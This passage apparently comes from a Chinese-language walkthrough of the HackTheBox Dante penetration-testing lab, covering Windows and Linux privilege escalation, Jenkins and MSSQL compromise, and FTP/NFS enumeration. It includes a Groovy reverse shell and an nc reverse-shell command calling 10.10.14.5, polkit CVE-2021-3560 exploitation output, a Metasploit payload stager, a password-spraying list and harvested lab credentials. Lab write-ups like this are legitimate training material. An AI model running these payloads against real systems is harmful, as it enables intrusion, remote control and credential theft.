<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateNamedPipeW Success! IntPtr:2744
<span class="o">[</span><span class="k">*</span><span class="o">]</span> RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2124303388560
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ConnectNamePipe Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentUserName : blake
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentConnectPipeUserName : SYSTEM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ImpersonateNamedPipeClient Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> OpenThreadToken Success! IntPtr:1660
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DuplicateTokenEx Success! IntPtr:1652
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SetThreadToken Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentThreadUserName : NT AUTHORITY<span class="se">\S</span>YSTEM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateOutReadPipe Success! out_read:1648 out_write:1640
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateErrReadPipe Success! err_read:1664 err_write:1672
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateProcessWithTokenW Success! ProcessPid:5076
nt authority<span class="se">\s</span>ystem


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bye!

</code></pre></div></div>
<p>但不知道什么原因，执行 runme.bat 或者 nc 反弹 shell 时会卡住。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-BadPotato</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"c:\temp\nc.exe -e powershell.exe 10.10.14.5 9001"</span><span class="w">
</span><span class="n">Invoke-BadPotato</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"c:\temp\runme.bat"</span><span class="w">
</span></code></pre></div></div>
<p>直接使用 msf 内置的 getsystem 获取到 system 权限。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getsystem
...got system via technique 5 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>PrintSpooler variant<span class="o">))</span><span class="nb">.</span>
</code></pre></div></div>

<h1 id="linux-17216119">Linux: 172.16.1.19</h1>
<p>172.16.1.19	80      apache 服务，可显示目录，但没有内容
172.16.1.19	8080    Jekins 服务
172.16.1.19	8443    可能是扫描错误，无法访问
172.16.1.19	8888    可能是扫描错误，无法访问</p>

<p>部分端口无法访问，可能是使用 fscan 扫描出现问题，可以使用 nmap 重新扫一遍。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> nmap 172.16.1.102 <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-T5</span>
</code></pre></div></div>

<h2 id="jekins-后台-getshell">Jekins 后台 getshell</h2>
<p>goby 扫描 Jenkins 版本为 2.240，存在 WEB-INF/web.xml 读取漏洞，但复现后发现并未存在，应该是误报。</p>

<p>2.240 版本没有公开漏洞，尝试爆破用户名密码。msf 中有集成 jenkins 登陆爆破脚本：</p>
<ul>
  <li>auxiliary/scanner/http/jenkins_login</li>
</ul>

<p>利用脚本的 USERPASS_FILE 可以设置用户名密码文件，用户名和密码之间用空格切分。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith Princess1
smoggat Summer2019
tmodle P45678!
ccraven Password1
kploty Teacher65
jbercov 4567Holiday1
whaguey acb123
dcamtan WorldOfWarcraft67
tspadly RopeBlackfieldForwardslash
ematlis JuneJuly1TY
fglacdon FinalFantasy7
tmentrso 65RedBalloons
dharding WestminsterOrange5
smillar MarksAndSparks91
bjohnston Bullingdon1
iahmed Sheffield23
plongbottom PowerfixSaturdayClub777
jcarrot Tanenbaum0001
lgesley SuperStrongCantForget123456789
julian manchesterunited
ben Welcometomyblog
balthazar TheJoker12345!
mrb3n S3kur1ty2020!
</code></pre></div></div>

<p>但此前在 172.16.2.5 (DANTE-DC02) 中获取到了一个 jenkins.bat，其中就包含了一个 jenkins 的凭证，该凭证可以正常登陆到后台。</p>
<ul>
  <li>Admin_129834765/SamsungOctober102030</li>
</ul>

<p>登陆成功后可以看到一个 Project FLAG_HERE，其中包含了 flag</p>

<p>jenkins 中的 script console 可以进一步通过执行 Groovy 获取系统 shell。访问 url：/script</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">host</span><span class="o">=</span><span class="s">"10.10.14.5"</span><span class="o">;</span><span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">9898</span><span class="o">;</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s">"bash"</span><span class="o">;</span><span class="nc">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="nc">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="nc">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="nc">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="nc">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</code></pre></div></div>
<p>pwncat-cs：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listen <span class="nt">-m</span> linux 9898
</code></pre></div></div>
<h2 id="提权至-ian-pspy">提权至 ian: pspy</h2>
<p>pspy 可以查看到一些隐藏的进程，其中可能就包含了敏感的凭证信息，这部分功能是 linPEAS 不具备的。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142235 | /usr/sbin/CRON <span class="nt">-f</span> 
2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142237 | /bin/bash mysql <span class="nt">-u</span> ian <span class="nt">-p</span> VPN123ZXC 
2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142236 | /bin/sh <span class="nt">-c</span> /bin/bash mysql <span class="nt">-u</span> ian <span class="nt">-p</span> VPN123ZXC 
</code></pre></div></div>
<p>pspy 找到了一个由 ian 用户运行的 mysql 连接，密码为 VPN123ZXC</p>

<h2 id="提权至-root-polkitcve-2021-3560-1">提权至 root: polkit:CVE-2021-3560</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                               
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

<span class="o">[</span>+] Assessing machine state...                                                                                                                      
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] System is vulnerable! Run again with <span class="s1">'--exploit polkit:CVE-2021-3560'</span> to exploit it.
<span class="o">(</span>remote<span class="o">)</span> jenkins@DANTE-NIX07:/tmp/.j<span class="nv">$ </span>./.t <span class="nt">--exploit</span> polkit:CVE-2021-3560


▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                               
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

<span class="o">[</span>+] Assessing machine state...                                                                                                                      
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it...
<span class="o">[</span>+][polkit:CVE-2021-3560] Sampling timing of user creation command...
<span class="o">[</span>+][polkit:CVE-2021-3560] Average <span class="nb">time </span><span class="k">for </span>user creation to fail authentication is 5.879881ms
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting to create user <span class="s1">'traitor795'</span> by forcing <span class="nv">UID</span><span class="o">=</span>0...
<span class="o">[</span>+][polkit:CVE-2021-3560] User <span class="s1">'traitor795'</span> was created with UID <span class="o">(</span>1002<span class="o">)!</span>
<span class="o">[</span>+][polkit:CVE-2021-3560] Sampling timing of password <span class="nb">set </span>command...
<span class="o">[</span>+][polkit:CVE-2021-3560] Average <span class="nb">time </span><span class="k">for </span>password <span class="nb">set </span>to fail authentication is 5.447048ms
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting to <span class="nb">set </span>user password...
<span class="o">[</span>+][polkit:CVE-2021-3560] Finished attempting to <span class="nb">set </span>password.
<span class="o">[</span>+][polkit:CVE-2021-3560] Setting up tty...
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting authentication as new user...
<span class="o">[</span>+][polkit:CVE-2021-3560] Authenticated as traitor795 <span class="o">(</span>1002<span class="o">)!</span>
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting escalation to root...
<span class="o">[</span>+][polkit:CVE-2021-3560] Authenticated as root!
<span class="o">[</span>+][polkit:CVE-2021-3560] Writing payload...

root@DANTE-NIX07:~# <span class="nb">ls</span>
</code></pre></div></div>
<h2 id="提权-disk-组用户利用">提权: disk 组用户利用</h2>
<p>ian 用户属于 disk 组，”disk”是一个特殊用途的系统组，用于授予用户对磁盘访问的权限。这意味着属于”disk”组的用户可能具有特定的磁盘访问权限，例如对硬盘驱动器进行读写操作。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>
</code></pre></div></div>
<p>切换到 ian 后查看 /proc/self/mounts 来获取磁盘信息：<code class="language-plaintext highlighter-rouge">cat /proc/self/mounts|grep 'sda'</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/self/mounts|grep <span class="s1">'sda'</span>
/dev/sda5 / ext4 rw,relatime,errors<span class="o">=</span>remount-ro 0 0
/dev/sda1 /boot/efi vfat rw,relatime,fmask<span class="o">=</span>0077,dmask<span class="o">=</span>0077,codepage<span class="o">=</span>437,iocharset<span class="o">=</span>iso8859-1,shortname<span class="o">=</span>mixed,errors<span class="o">=</span>remount-ro 0 0
</code></pre></div></div>
<p>可以看到挂载的 /dev/sda5 就是根目录，并且 ian 用户具备 rw 权限，说明可以通过 debugfs 直接读取任意的文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ian@DANTE-NIX07:/tmp<span class="nv">$ </span>debugfs /dev/sda5
debugfs 1.45.5 <span class="o">(</span>07-Jan-2020<span class="o">)</span>
debugfs:  <span class="nb">cat</span> /root/flag.txt
DANTE<span class="o">{</span>g0tta_&lt;3_ins3cur3_GROupz!<span class="o">}</span>
debugfs:  
</code></pre></div></div>
<h1 id="windows-1721615">Windows: 172.16.1.5</h1>
<p>开放端口：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5985,135,445,111,2049,139,1433,47001,21
</code></pre></div></div>
<ol>
  <li>1433 MSSQL</li>
  <li>21 ftp
    <h2 id="ftp-允许匿名登陆">FTP 允许匿名登陆</h2>
    <p>使用 cme 可以批量扫描内网中的 ftp 是否允许 anonymous 登陆。</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> crackmapexec ftp 172.16.1.0/24 <span class="nt">-u</span> anonymous <span class="nt">-p</span> <span class="s1">''</span>
</code></pre></div>    </div>
    <p>结果如下：</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FTP         172.16.1.5      21     172.16.1.5       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: Dante Staff Drop Box
FTP         172.16.1.100    21     172.16.1.100     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
FTP         172.16.1.101    21     172.16.1.101     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner:-FileZilla Server 0.9.60 beta
220 DANTE-FTP
FTP         172.16.1.12     21     172.16.1.12      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: ProFTPD Server <span class="o">(</span>ProFTPD<span class="o">)</span> <span class="o">[</span>::ffff:172.16.1.12]
FTP         172.16.1.5      21     172.16.1.5       <span class="o">[</span>+] anonymous:
FTP         172.16.1.100    21     172.16.1.100     <span class="o">[</span>+] anonymous:
FTP         172.16.1.101    21     172.16.1.101     <span class="o">[</span>-] anonymous: <span class="o">(</span>Response:530 Login or password incorrect!<span class="o">)</span>
FTP         172.16.1.12     21     172.16.1.12      <span class="o">[</span>-] anonymous: <span class="o">(</span>Response:530 Login incorrect.<span class="o">)</span>
</code></pre></div>    </div>
    <p>可以发现 172.16.1.5 也同样允许 ftp 匿名登陆。</p>
  </li>
</ol>

<p>登陆后可以得到一个 flag.txt</p>

<h2 id="nfs-服务探测">NFS 服务探测</h2>
<p>172.16.1.5 的 2049 端口运行了 nfs 服务，nfs 服务与 SMB 有着相同的用途，但没有身份验证和授权机制。</p>

<p>hacktricks 中详细记录了对 nfs 服务的渗透思路：<a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">2049 - Pentesting NFS Service - HackTricks</a></p>

<p>但 nfs 服务上没有挂载任何东西。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> showmount <span class="nt">-e</span> 172.168.1.5
</code></pre></div></div>

<h2 id="mssql-xp_cmdshell">MSSQL: xp_cmdshell</h2>
<p>此前在 172.16.2.6 中获取到一个 SQL 凭证：</p>
<ul>
  <li>Sophie/TerrorInflictPurpleDirt996655</li>
</ul>

<p>msf 中集成了 MSSQL 登陆的脚本：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/mssql/mssql_login
<span class="nb">set </span>USERNAME Sophie
<span class="nb">set </span>PASSWORD TerrorInflictPurpleDirt996655
<span class="nb">set </span>RHOST 172.16.1.5
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433       - 172.16.1.5:1433 - MSSQL - Starting authentication scanner.
<span class="o">[!]</span> 172.16.1.5:1433       - No active DB <span class="nt">--</span> Credential data will not be saved!
<span class="o">[</span>+] 172.16.1.5:1433       - 172.16.1.5:1433 - Login Successful: WORKSTATION<span class="se">\S</span>ophie:TerrorInflictPurpleDirt996655
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
</code></pre></div></div>

<p>连接 MSSQL 可以使用 impacket 中的 mssqlclient.py</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
</code></pre></div></div>
<p>但会出现报错，应该是本地环境的问题。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] <span class="o">[(</span><span class="s1">'SSL routines'</span>, <span class="s1">''</span>, <span class="s1">'no protocols available'</span><span class="o">)]</span>
</code></pre></div></div>
<p>切换到 python 3.9 + Impacket v0.11.0 可以正常连接并执行 xp_cmdshell。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DANTE-SQL01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DANTE-SQL01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>sophie  dbo@master<span class="o">)&gt;</span> EXEC xp_cmdshell <span class="s2">"net user"</span><span class="p">;</span>

</code></pre></div></div>

<h2 id="mssql-xp_cmdshell-msf">MSSQL: xp_cmdshell (MSF)</h2>
<p>msf 也集成了对 MSSQL xp_cmdshell 的利用，该 exp 会尝试远程下载 payload 再运行。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/mssql/mssql_payload
<span class="nb">set </span>LHOST 10.10.14.5
<span class="nb">set </span>RHOST 172.16.1.5
<span class="nb">set </span>username Sophie
<span class="nb">set </span>PassWORD TerrorInflictPurpleDirt996655
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   1.47% <span class="k">done</span> <span class="o">(</span>1499/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   2.93% <span class="k">done</span> <span class="o">(</span>2998/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   4.40% <span class="k">done</span> <span class="o">(</span>4497/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   5.86% <span class="k">done</span> <span class="o">(</span>5996/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   7.33% <span class="k">done</span> <span class="o">(</span>7495/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   8.80% <span class="k">done</span> <span class="o">(</span>8994/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  10.26% <span class="k">done</span> <span class="o">(</span>10493/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  11.73% <span class="k">done</span> <span class="o">(</span>11992/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  13.19% <span class="k">done</span> <span class="o">(</span>13491/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  14.66% <span class="k">done</span> <span class="o">(</span>14990/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  16.13% <span class="k">done</span> <span class="o">(</span>16489/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  17.59% <span class="k">done</span> <span class="o">(</span>17988/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  19.06% <span class="k">done</span> <span class="o">(</span>19487/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  20.53% <span class="k">done</span> <span class="o">(</span>20986/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  21.99% <span class="k">done</span> <span class="o">(</span>22485/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  23.46% <span class="k">done</span> <span class="o">(</span>23984/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  24.92% <span class="k">done</span> <span class="o">(</span>25483/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  26.39% <span class="k">done</span> <span class="o">(</span>26982/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  27.86% <span class="k">done</span> <span class="o">(</span>28481/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  29.32% <span class="k">done</span> <span class="o">(</span>29980/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  30.79% <span class="k">done</span> <span class="o">(</span>31479/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  32.25% <span class="k">done</span> <span class="o">(</span>32978/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  33.72% <span class="k">done</span> <span class="o">(</span>34477/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  35.19% <span class="k">done</span> <span class="o">(</span>35976/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  36.65% <span class="k">done</span> <span class="o">(</span>37475/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  38.12% <span class="k">done</span> <span class="o">(</span>38974/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  39.58% <span class="k">done</span> <span class="o">(</span>40473/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  41.05% <span class="k">done</span> <span class="o">(</span>41972/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  42.52% <span class="k">done</span> <span class="o">(</span>43471/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  43.98% <span class="k">done</span> <span class="o">(</span>44970/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  45.45% <span class="k">done</span> <span class="o">(</span>46469/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  46.91% <span class="k">done</span> <span class="o">(</span>47968/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  48.38% <span class="k">done</span> <span class="o">(</span>49467/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  49.85% <span class="k">done</span> <span class="o">(</span>50966/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  51.31% <span class="k">done</span> <span class="o">(</span>52465/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  52.78% <span class="k">done</span> <span class="o">(</span>53964/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  54.24% <span class="k">done</span> <span class="o">(</span>55463/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  55.71% <span class="k">done</span> <span class="o">(</span>56962/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  57.18% <span class="k">done</span> <span class="o">(</span>58461/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  58.64% <span class="k">done</span> <span class="o">(</span>59960/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  60.11% <span class="k">done</span> <span class="o">(</span>61459/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  61.58% <span class="k">done</span> <span class="o">(</span>62958/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  63.04% <span class="k">done</span> <span class="o">(</span>64457/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  64.51% <span class="k">done</span> <span class="o">(</span>65956/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  65.97% <span class="k">done</span> <span class="o">(</span>67455/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  67.44% <span class="k">done</span> <span class="o">(</span>68954/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  68.91% <span class="k">done</span> <span class="o">(</span>70453/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  70.37% <span class="k">done</span> <span class="o">(</span>71952/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  71.84% <span class="k">done</span> <span class="o">(</span>73451/102246 bytes<span class="o">)</span>
